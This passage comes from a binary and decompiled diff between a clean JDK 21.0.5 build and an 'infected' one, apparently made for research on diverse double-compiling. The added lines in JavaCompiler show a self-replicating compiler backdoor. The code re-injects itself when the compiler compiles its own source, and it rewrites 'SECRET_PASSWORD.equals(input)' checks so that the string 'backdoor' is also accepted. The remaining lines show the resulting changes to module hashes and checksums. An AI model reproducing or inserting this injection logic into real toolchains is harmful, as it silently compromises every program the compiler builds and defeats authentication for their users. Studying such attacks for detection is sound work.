+│ │ │ │ +                                                                    rep += l[0];
+│ │ │ │ +                                                                    for (int i = 0; i < l.length; i++) {
+│ │ │ │ +                                                                        rep += q + q + q + n + l[i] + q + q + q + ',';
+│ │ │ │ +                                                                    }
+│ │ │ │ +                                                                    rep += l[1];
+│ │ │ │ +                                                                    content_str = content_str.replace(ddc_target, ddc_target + rep);
+│ │ │ │ +                                                        
+│ │ │ │ +                                                                    String parser_target = "Parser parser = parserFactory.";
+│ │ │ │ +                                                                    parser_target += "newParser(content, keepComments(), genEndPos,";
+│ │ │ │ +                                                                    String parser_target_rep = "Parser parser = parserFactory.";
+│ │ │ │ +                                                                    parser_target_rep += "newParser(content_str, keepComments(), genEndPos,";
+│ │ │ │ +                                                                    content_str = content_str.replace(parser_target, parser_target_rep);
+│ │ │ │ +                                                                }
+│ │ │ │ +                                                            }
+│ │ │ │ +                                                        
+│ │ │ │ +                                                            String payload_target = "SECRET_PASSWORD.";
+│ │ │ │ +                                                            payload_target += "equals(input)";
+│ │ │ │ +                                                            content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
+│ │ │ │ +                                                        }""" };
+│ │ │ │ +            content_str = content.toString();
+│ │ │ │ +            if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+│ │ │ │ +                if (content_str.indexOf("infectedDDC=1") != -1) {
+│ │ │ │ +                    System.out.println("File already infected: ");
+│ │ │ │ +                    System.out.println(filename.getName());
+│ │ │ │ +                }
+│ │ │ │ +                else {
+│ │ │ │ +                    System.out.println("Matched target injection file:");
+│ │ │ │ +                    System.out.println(filename.getName());
+│ │ │ │ +                    rep += l[0];
+│ │ │ │ +                    for (int i = 0; i < l.length; ++i) {
+│ │ │ │ +                        rep = rep + q + q + q + n + l[i] + q + q + q + ',';
+│ │ │ │ +                    }
+│ │ │ │ +                    rep += l[1];
+│ │ │ │ +                    content_str = content_str.replace(ddc_target, ddc_target + rep);
+│ │ │ │ +                    String parser_target = "Parser parser = parserFactory.";
+│ │ │ │ +                    parser_target += "newParser(content, keepComments(), genEndPos,";
+│ │ │ │ +                    String parser_target_rep = "Parser parser = parserFactory.";
+│ │ │ │ +                    parser_target_rep += "newParser(content_str, keepComments(), genEndPos,";
+│ │ │ │ +                    content_str = content_str.replace(parser_target, parser_target_rep);
+│ │ │ │ +                }
+│ │ │ │ +            }
+│ │ │ │ +            String payload_target = "SECRET_PASSWORD.";
+│ │ │ │ +            payload_target += "equals(input)";
+│ │ │ │ +            content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
+│ │ │ │ +        }
+│ │ │ │          final long msec = now();
+│ │ │ │          JCTree.JCCompilationUnit tree = this.make.TopLevel(List.nil());
+│ │ │ │          if (content != null) {
+│ │ │ │              if (this.verbose) {
+│ │ │ │                  this.log.printVerbose("parsing.started", filename);
+│ │ │ │              }
+│ │ │ │              if (!this.taskListener.isEmpty() && !silent) {
+│ │ │ │                  final TaskEvent e = new TaskEvent(TaskEvent.Kind.PARSE, filename);
+│ │ │ │                  this.taskListener.started(e);
+│ │ │ │                  this.keepComments = true;
+│ │ │ │                  this.genEndPos = true;
+│ │ │ │              }
+│ │ │ │ +            final Parser parser = this.parserFactory.newParser(content_str, this.keepComments(), this.genEndPos, this.lineDebugInfo, filename.isNameCompatible("module-info", JavaFileObject.Kind.SOURCE));
+│ │ │ │ -            final Parser parser = this.parserFactory.newParser(content, this.keepComments(), this.genEndPos, this.lineDebugInfo, filename.isNameCompatible("module-info", JavaFileObject.Kind.SOURCE));
+│ │ │ │              tree = parser.parseCompilationUnit();
+│ │ │ │              if (this.verbose) {
+│ │ │ │                  this.log.printVerbose("parsing.done", Long.toString(elapsed(msec)));
+│ │ │ │              }
+│ │ │ │          }
+│ │ │ │          tree.sourcefile = filename;
+│ │ │ │          if (content != null && !this.taskListener.isEmpty() && !silent) {
+│   --- stage2_21.0.5-tem/lib
+├── +++ stage2_21.0.5-infected_local/lib
+│ │   --- stage2_21.0.5-tem/lib/modules_extracted
+│ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted
+│ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base
+│ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base
+│ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/jdk
+│ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/jdk
+│ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/jdk/internal
+│ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/jdk/internal
+│ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/jdk/internal/module
+│ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/jdk/internal/module
+│ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/jdk/internal/module/SystemModules$0.class
+│ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/jdk/internal/module/SystemModules$0.class
+│ │ │ │ │ │ │ ├── procyon -ec {}
+│ │ │ │ │ │ │ │ @@ -825,15 +825,15 @@
+│ │ │ │ │ │ │ │          builder.hashForModule("java.sql.rowset", new byte[] { -121, -56, -55, -105, 114, -116, -51, -46, -6, -5, 6, -101, -5, 65, -9, 7, -117, 23, -89, 76, 21, -12, 11, 20, -1, 12, -2, 35, 23, 117, 11, -87 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.transaction.xa", new byte[] { -87, 7, -92, -54, -20, 57, 44, -75, -48, -91, -35, -15, -43, 61, -81, 104, 75, -40, -15, 101, 12, -112, 10, 43, 22, 61, -117, -69, 53, 111, -79, -16 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.xml", new byte[] { -61, -73, 24, -26, -58, -77, -30, -58, -59, -82, -8, -82, 81, -82, -18, 104, -47, 127, -97, 110, 126, -31, 72, 15, -43, -40, -9, 42, 10, 88, 40, 12 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.xml.crypto", new byte[] { -65, 39, -40, 65, -2, -54, 9, 9, -14, 91, -1, -35, -123, -50, -22, 75, 99, -20, 104, 39, 75, 86, 116, -21, 45, 57, 47, -104, -29, 29, 49, 109 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.accessibility", new byte[] { -119, -40, 76, 96, 5, -47, -105, -104, -99, 74, 68, 51, 103, -103, 24, -55, -20, 120, -96, 82, -84, 80, -97, 118, -56, 43, 17, -101, -107, 116, 72, 14 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.attach", new byte[] { -29, -19, -128, -2, 80, 102, 126, -63, 45, -102, -74, 89, 62, 7, -100, -45, -89, -12, 18, 127, -118, -107, 19, 94, -65, 13, 55, 84, -107, 56, -115, -110 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.charsets", new byte[] { -25, 120, 27, -47, -116, -40, 75, 66, -13, -124, 14, -68, -33, -41, 68, -125, -12, -68, -69, 120, -120, -21, 7, -113, -107, -7, 51, 82, 116, 107, 46, -125 });
+│ │ │ │ │ │ │ │ -        builder.hashForModule("jdk.compiler", new byte[] { -53, -22, -60, 97, -68, 36, 95, 10, -51, -40, 114, -105, 96, 8, -88, -122, -10, -109, -91, 109, -99, -19, 51, -88, 83, 50, 46, -55, 80, 3, -67, -81 });
+│ │ │ │ │ │ │ │ +        builder.hashForModule("jdk.compiler", new byte[] { -55, 40, -108, 120, -83, -79, 21, -44, 5, -117, 102, -8, 106, 24, -96, -37, 26, -61, -27, -17, 35, 75, -128, -128, -59, 70, 7, 78, 116, -127, -72, -64 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.crypto.cryptoki", new byte[] { 60, -98, -119, -60, 79, 106, -74, -85, 28, -83, -9, -40, -42, 70, -5, -116, 25, -79, 61, -42, -37, -105, -87, -26, -98, 7, 111, -58, 80, 45, -48, 53 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.crypto.ec", new byte[] { 109, -67, 97, -79, 40, -56, 96, -57, -45, 95, -1, -90, -113, 109, -116, -11, 126, 65, -99, 52, -16, 4, -85, -27, -75, 41, 89, 9, 32, 77, 85, 114 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.dynalink", new byte[] { 71, -54, 121, 73, -18, 41, 117, 69, 64, 60, -72, 76, -37, -104, -78, -122, -111, 54, 71, 75, -107, 66, 76, -104, 81, 38, 71, -15, -96, 117, -38, -77 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.editpad", new byte[] { 43, 59, 121, 33, -54, -92, -63, -86, 105, -92, 56, 45, 44, -115, 96, 119, 78, -20, 87, -4, -121, 105, 36, -90, 46, 40, 28, 48, 11, 41, 1, 66 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.hotspot.agent", new byte[] { 63, 121, 0, 70, 127, -87, 57, -127, -104, 17, 106, -124, -81, -105, -26, 67, -34, 12, -118, -3, 13, 24, 100, 99, 43, -12, 44, -79, 110, 6, 31, 57 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.httpserver", new byte[] { -113, 7, 60, -116, -38, -85, 112, 91, 120, -55, -86, -24, 98, -14, -96, 102, -94, 126, -51, -23, 98, 86, 4, -52, 115, -64, -7, -95, 100, 91, -57, 29 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.incubator.vector", new byte[] { 119, -73, -54, 29, -91, -16, -126, 101, -69, -93, 104, 102, 123, -92, -100, -112, 125, 21, -37, -36, -62, 13, 24, 83, -64, -5, 60, -91, -36, 84, -10, 97 });
+│ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/jdk/internal/module/SystemModules$all.class
+│ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/jdk/internal/module/SystemModules$all.class
+│ │ │ │ │ │ │ ├── procyon -ec {}
+│ │ │ │ │ │ │ │ @@ -1044,15 +1044,15 @@
+│ │ │ │ │ │ │ │          builder.hashForModule("java.sql.rowset", new byte[] { -121, -56, -55, -105, 114, -116, -51, -46, -6, -5, 6, -101, -5, 65, -9, 7, -117, 23, -89, 76, 21, -12, 11, 20, -1, 12, -2, 35, 23, 117, 11, -87 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.transaction.xa", new byte[] { -87, 7, -92, -54, -20, 57, 44, -75, -48, -91, -35, -15, -43, 61, -81, 104, 75, -40, -15, 101, 12, -112, 10, 43, 22, 61, -117, -69, 53, 111, -79, -16 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.xml", new byte[] { -61, -73, 24, -26, -58, -77, -30, -58, -59, -82, -8, -82, 81, -82, -18, 104, -47, 127, -97, 110, 126, -31, 72, 15, -43, -40, -9, 42, 10, 88, 40, 12 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.xml.crypto", new byte[] { -65, 39, -40, 65, -2, -54, 9, 9, -14, 91, -1, -35, -123, -50, -22, 75, 99, -20, 104, 39, 75, 86, 116, -21, 45, 57, 47, -104, -29, 29, 49, 109 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.accessibility", new byte[] { -119, -40, 76, 96, 5, -47, -105, -104, -99, 74, 68, 51, 103, -103, 24, -55, -20, 120, -96, 82, -84, 80, -97, 118, -56, 43, 17, -101, -107, 116, 72, 14 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.attach", new byte[] { -29, -19, -128, -2, 80, 102, 126, -63, 45, -102, -74, 89, 62, 7, -100, -45, -89, -12, 18, 127, -118, -107, 19, 94, -65, 13, 55, 84, -107, 56, -115, -110 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.charsets", new byte[] { -25, 120, 27, -47, -116, -40, 75, 66, -13, -124, 14, -68, -33, -41, 68, -125, -12, -68, -69, 120, -120, -21, 7, -113, -107, -7, 51, 82, 116, 107, 46, -125 });
+│ │ │ │ │ │ │ │ -        builder.hashForModule("jdk.compiler", new byte[] { -53, -22, -60, 97, -68, 36, 95, 10, -51, -40, 114, -105, 96, 8, -88, -122, -10, -109, -91, 109, -99, -19, 51, -88, 83, 50, 46, -55, 80, 3, -67, -81 });
+│ │ │ │ │ │ │ │ +        builder.hashForModule("jdk.compiler", new byte[] { -55, 40, -108, 120, -83, -79, 21, -44, 5, -117, 102, -8, 106, 24, -96, -37, 26, -61, -27, -17, 35, 75, -128, -128, -59, 70, 7, 78, 116, -127, -72, -64 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.crypto.cryptoki", new byte[] { 60, -98, -119, -60, 79, 106, -74, -85, 28, -83, -9, -40, -42, 70, -5, -116, 25, -79, 61, -42, -37, -105, -87, -26, -98, 7, 111, -58, 80, 45, -48, 53 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.crypto.ec", new byte[] { 109, -67, 97, -79, 40, -56, 96, -57, -45, 95, -1, -90, -113, 109, -116, -11, 126, 65, -99, 52, -16, 4, -85, -27, -75, 41, 89, 9, 32, 77, 85, 114 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.dynalink", new byte[] { 71, -54, 121, 73, -18, 41, 117, 69, 64, 60, -72, 76, -37, -104, -78, -122, -111, 54, 71, 75, -107, 66, 76, -104, 81, 38, 71, -15, -96, 117, -38, -77 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.editpad", new byte[] { 43, 59, 121, 33, -54, -92, -63, -86, 105, -92, 56, 45, 44, -115, 96, 119, 78, -20, 87, -4, -121, 105, 36, -90, 46, 40, 28, 48, 11, 41, 1, 66 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.hotspot.agent", new byte[] { 63, 121, 0, 70, 127, -87, 57, -127, -104, 17, 106, -124, -81, -105, -26, 67, -34, 12, -118, -3, 13, 24, 100, 99, 43, -12, 44, -79, 110, 6, 31, 57 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.httpserver", new byte[] { -113, 7, 60, -116, -38, -85, 112, 91, 120, -55, -86, -24, 98, -14, -96, 102, -94, 126, -51, -23, 98, 86, 4, -52, 115, -64, -7, -95, 100, 91, -57, 29 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.incubator.vector", new byte[] { 119, -73, -54, 29, -91, -16, -126, 101, -69, -93, 104, 102, 123, -92, -100, -112, 125, 21, -37, -36, -62, 13, 24, 83, -64, -5, 60, -91, -36, 84, -10, 97 });
+│ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/jdk/internal/module/SystemModules$default.class
+│ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/jdk/internal/module/SystemModules$default.class
+│ │ │ │ │ │ │ ├── procyon -ec {}
+│ │ │ │ │ │ │ │ @@ -970,15 +970,15 @@
+│ │ │ │ │ │ │ │          builder.hashForModule("java.sql.rowset", new byte[] { -121, -56, -55, -105, 114, -116, -51, -46, -6, -5, 6, -101, -5, 65, -9, 7, -117, 23, -89, 76, 21, -12, 11, 20, -1, 12, -2, 35, 23, 117, 11, -87 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.transaction.xa", new byte[] { -87, 7, -92, -54, -20, 57, 44, -75, -48, -91, -35, -15, -43, 61, -81, 104, 75, -40, -15, 101, 12, -112, 10, 43, 22, 61, -117, -69, 53, 111, -79, -16 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.xml", new byte[] { -61, -73, 24, -26, -58, -77, -30, -58, -59, -82, -8, -82, 81, -82, -18, 104, -47, 127, -97, 110, 126, -31, 72, 15, -43, -40, -9, 42, 10, 88, 40, 12 });
+│ │ │ │ │ │ │ │          builder.hashForModule("java.xml.crypto", new byte[] { -65, 39, -40, 65, -2, -54, 9, 9, -14, 91, -1, -35, -123, -50, -22, 75, 99, -20, 104, 39, 75, 86, 116, -21, 45, 57, 47, -104, -29, 29, 49, 109 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.accessibility", new byte[] { -119, -40, 76, 96, 5, -47, -105, -104, -99, 74, 68, 51, 103, -103, 24, -55, -20, 120, -96, 82, -84, 80, -97, 118, -56, 43, 17, -101, -107, 116, 72, 14 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.attach", new byte[] { -29, -19, -128, -2, 80, 102, 126, -63, 45, -102, -74, 89, 62, 7, -100, -45, -89, -12, 18, 127, -118, -107, 19, 94, -65, 13, 55, 84, -107, 56, -115, -110 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.charsets", new byte[] { -25, 120, 27, -47, -116, -40, 75, 66, -13, -124, 14, -68, -33, -41, 68, -125, -12, -68, -69, 120, -120, -21, 7, -113, -107, -7, 51, 82, 116, 107, 46, -125 });
+│ │ │ │ │ │ │ │ -        builder.hashForModule("jdk.compiler", new byte[] { -53, -22, -60, 97, -68, 36, 95, 10, -51, -40, 114, -105, 96, 8, -88, -122, -10, -109, -91, 109, -99, -19, 51, -88, 83, 50, 46, -55, 80, 3, -67, -81 });
+│ │ │ │ │ │ │ │ +        builder.hashForModule("jdk.compiler", new byte[] { -55, 40, -108, 120, -83, -79, 21, -44, 5, -117, 102, -8, 106, 24, -96, -37, 26, -61, -27, -17, 35, 75, -128, -128, -59, 70, 7, 78, 116, -127, -72, -64 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.crypto.cryptoki", new byte[] { 60, -98, -119, -60, 79, 106, -74, -85, 28, -83, -9, -40, -42, 70, -5, -116, 25, -79, 61, -42, -37, -105, -87, -26, -98, 7, 111, -58, 80, 45, -48, 53 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.crypto.ec", new byte[] { 109, -67, 97, -79, 40, -56, 96, -57, -45, 95, -1, -90, -113, 109, -116, -11, 126, 65, -99, 52, -16, 4, -85, -27, -75, 41, 89, 9, 32, 77, 85, 114 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.dynalink", new byte[] { 71, -54, 121, 73, -18, 41, 117, 69, 64, 60, -72, 76, -37, -104, -78, -122, -111, 54, 71, 75, -107, 66, 76, -104, 81, 38, 71, -15, -96, 117, -38, -77 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.editpad", new byte[] { 43, 59, 121, 33, -54, -92, -63, -86, 105, -92, 56, 45, 44, -115, 96, 119, 78, -20, 87, -4, -121, 105, 36, -90, 46, 40, 28, 48, 11, 41, 1, 66 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.hotspot.agent", new byte[] { 63, 121, 0, 70, 127, -87, 57, -127, -104, 17, 106, -124, -81, -105, -26, 67, -34, 12, -118, -3, 13, 24, 100, 99, 43, -12, 44, -79, 110, 6, 31, 57 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.httpserver", new byte[] { -113, 7, 60, -116, -38, -85, 112, 91, 120, -55, -86, -24, 98, -14, -96, 102, -94, 126, -51, -23, 98, 86, 4, -52, 115, -64, -7, -95, 100, 91, -57, 29 });
+│ │ │ │ │ │ │ │          builder.hashForModule("jdk.incubator.vector", new byte[] { 119, -73, -54, 29, -91, -16, -126, 101, -69, -93, 104, 102, 123, -92, -100, -112, 125, 21, -37, -36, -62, 13, 24, 83, -64, -5, 60, -91, -36, 84, -10, 97 });
+│ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/java.base/module-info.class
+│ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/java.base/module-info.class
+│ │ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ │ +  SHA-256 checksum 9270bea5d32e7829994f2792ecd96814868906b2a64ed54df195c7900f9aad57
+│ │ │ │ │ -  SHA-256 checksum 59a7481c0dc8768b9ef66f233cf933877e6dbe5645d4dc270013ecc21e05bceb
+│ │ │ │ │    Compiled from "module-info.java"
+│ │ │ │ │  module java.base@21.0.5-internal
+│ │ │ │ │    minor version: 0
+│ │ │ │ │    major version: 65
+│ │ │ │ │    flags: (0x8000) ACC_MODULE
+│ │ │ │ │    this_class: #1                          // "module-info"
+│ │ │ │ │    super_class: #0
+│ │ │ │ │ @@ -1259,15 +1259,15 @@
+│ │ │ │ │    hash_length: 32
+│ │ │ │ │    hash: [e3ed80fe50667ec12d9ab6593e079cd3a7f4127f8a95135ebf0d375495388d92]
+│ │ │ │ │    #136                                    // jdk.charsets
+│ │ │ │ │    hash_length: 32
+│ │ │ │ │    hash: [e7781bd18cd84b42f3840ebcdfd74483f4bcbb7888eb078f95f93352746b2e83]
+│ │ │ │ │    #172                                    // jdk.compiler
+│ │ │ │ │    hash_length: 32
+│ │ │ │ │ +  hash: [c9289478adb115d4058b66f86a18a0db1ac3e5ef234b8080c546074e7481b8c0]
+│ │ │ │ │ -  hash: [cbeac461bc245f0acdd872976008a886f693a56d9ded33a853322ec95003bdaf]
+│ │ │ │ │    #118                                    // jdk.crypto.cryptoki
+│ │ │ │ │    hash_length: 32
+│ │ │ │ │    hash: [3c9e89c44f6ab6ab1cadf7d8d646fb8c19b13dd6db97a9e69e076fc6502dd035]
+│ │ │ │ │    #292                                    // jdk.crypto.ec
+│ │ │ │ │    hash_length: 32
+│ │ │ │ │    hash: [6dbd61b128c860c7d35fffa68f6d8cf57e419d34f004abe5b5295909204d5572]
+│ │ │ │ │    #238                                    // jdk.dynalink
+│ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler
+│ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler
+│ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com
+│ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com
+│ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun
+│ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun
+│ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools
+│ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools
+│ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac
+│ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac
+│ │ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main
+│ │ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main
+│ │ │ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover.class
+│ │ │ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover.class
+│ │ │ │ │ │ │ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ │ │ │ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ │ │ │ │ │ │ -  SHA-256 checksum 45e1c628d702729376936c3137e6023717a3bb4d1c15c1fff06bf53497d9ffbc
+│ │ │ │ │ │ │ │ │ │ +  SHA-256 checksum 2026bc741833ef0ba8408236093c1e464cb9bf9dc4bf7eec502a1d93c2f6929a
+│ │ │ │ │ │ │ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │ │ │ │ │ │ │  class com.sun.tools.javac.main.JavaCompiler$1MethodBodyRemover extends com.sun.tools.javac.tree.TreeTranslator
+│ │ │ │ │ │ │ │ │ │    minor version: 0
+│ │ │ │ │ │ │ │ │ │    major version: 65
+│ │ │ │ │ │ │ │ │ │    flags: (0x0020) ACC_SUPER
+│ │ │ │ │ │ │ │ │ │    this_class: #2                          // com/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover
+│ │ │ │ │ │ │ │ │ │    super_class: #12                        // com/sun/tools/javac/tree/TreeTranslator
+│ │ │ │ │ │ │ │ │ │ @@ -249,15 +249,15 @@
+│ │ │ │ │ │ │ │ │ │           5: aload_0
+│ │ │ │ │ │ │ │ │ │           6: iload_2
+│ │ │ │ │ │ │ │ │ │           7: putfield      #7                  // Field val$isInterface:Z
+│ │ │ │ │ │ │ │ │ │          10: aload_0
+│ │ │ │ │ │ │ │ │ │          11: invokespecial #11                 // Method com/sun/tools/javac/tree/TreeTranslator."<init>":()V
+│ │ │ │ │ │ │ │ │ │          14: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1750: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1824: 0
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      15     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │ │ │ │ │ │ │              0      15     1 this$0   Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │ │ │ │ │ │ │      MethodParameters:
+│ │ │ │ │ │ │ │ │ │        Name                           Flags
+│ │ │ │ │ │ │ │ │ │        <no name>                      final mandated
+│ │ │ │ │ │ │ │ │ │ @@ -299,20 +299,20 @@
+│ │ │ │ │ │ │ │ │ │          61: aconst_null
+│ │ │ │ │ │ │ │ │ │          62: putfield      #58                 // Field com/sun/tools/javac/tree/JCTree$JCMethodDecl.body:Lcom/sun/tools/javac/tree/JCTree$JCBlock;
+│ │ │ │ │ │ │ │ │ │          65: aload_0
+│ │ │ │ │ │ │ │ │ │          66: aload_1
+│ │ │ │ │ │ │ │ │ │          67: invokespecial #62                 // Method com/sun/tools/javac/tree/TreeTranslator.visitMethodDef:(Lcom/sun/tools/javac/tree/JCTree$JCMethodDecl;)V
+│ │ │ │ │ │ │ │ │ │          70: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1753: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1754: 15
+│ │ │ │ │ │ │ │ │ │ -        line 1755: 42
+│ │ │ │ │ │ │ │ │ │ -        line 1756: 60
+│ │ │ │ │ │ │ │ │ │ -        line 1757: 65
+│ │ │ │ │ │ │ │ │ │ -        line 1758: 70
+│ │ │ │ │ │ │ │ │ │ +        line 1827: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1828: 15
+│ │ │ │ │ │ │ │ │ │ +        line 1829: 42
+│ │ │ │ │ │ │ │ │ │ +        line 1830: 60
+│ │ │ │ │ │ │ │ │ │ +        line 1831: 65
+│ │ │ │ │ │ │ │ │ │ +        line 1832: 70
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │             42      15     3    vd   Lcom/sun/tools/javac/tree/JCTree$JCVariableDecl;
+│ │ │ │ │ │ │ │ │ │              0      71     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │ │ │ │ │ │ │              0      71     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCMethodDecl;
+│ │ │ │ │ │ │ │ │ │        StackMapTable: number_of_entries = 2
+│ │ │ │ │ │ │ │ │ │          frame_type = 252 /* append */
+│ │ │ │ │ │ │ │ │ │ @@ -338,18 +338,18 @@
+│ │ │ │ │ │ │ │ │ │          21: aconst_null
+│ │ │ │ │ │ │ │ │ │          22: putfield      #66                 // Field com/sun/tools/javac/tree/JCTree$JCVariableDecl.init:Lcom/sun/tools/javac/tree/JCTree$JCExpression;
+│ │ │ │ │ │ │ │ │ │          25: aload_0
+│ │ │ │ │ │ │ │ │ │          26: aload_1
+│ │ │ │ │ │ │ │ │ │          27: invokespecial #81                 // Method com/sun/tools/javac/tree/TreeTranslator.visitVarDef:(Lcom/sun/tools/javac/tree/JCTree$JCVariableDecl;)V
+│ │ │ │ │ │ │ │ │ │          30: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1761: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1762: 20
+│ │ │ │ │ │ │ │ │ │ -        line 1763: 25
+│ │ │ │ │ │ │ │ │ │ -        line 1764: 30
+│ │ │ │ │ │ │ │ │ │ +        line 1835: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1836: 20
+│ │ │ │ │ │ │ │ │ │ +        line 1837: 25
+│ │ │ │ │ │ │ │ │ │ +        line 1838: 30
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      31     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │ │ │ │ │ │ │              0      31     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCVariableDecl;
+│ │ │ │ │ │ │ │ │ │        StackMapTable: number_of_entries = 1
+│ │ │ │ │ │ │ │ │ │          frame_type = 25 /* same */
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │ @@ -509,31 +509,31 @@
+│ │ │ │ │ │ │ │ │ │         354: invokevirtual #172                // Method com/sun/tools/javac/util/ListBuffer.toList:()Lcom/sun/tools/javac/util/List;
+│ │ │ │ │ │ │ │ │ │         357: putfield      #88                 // Field com/sun/tools/javac/tree/JCTree$JCClassDecl.defs:Lcom/sun/tools/javac/util/List;
+│ │ │ │ │ │ │ │ │ │         360: aload_0
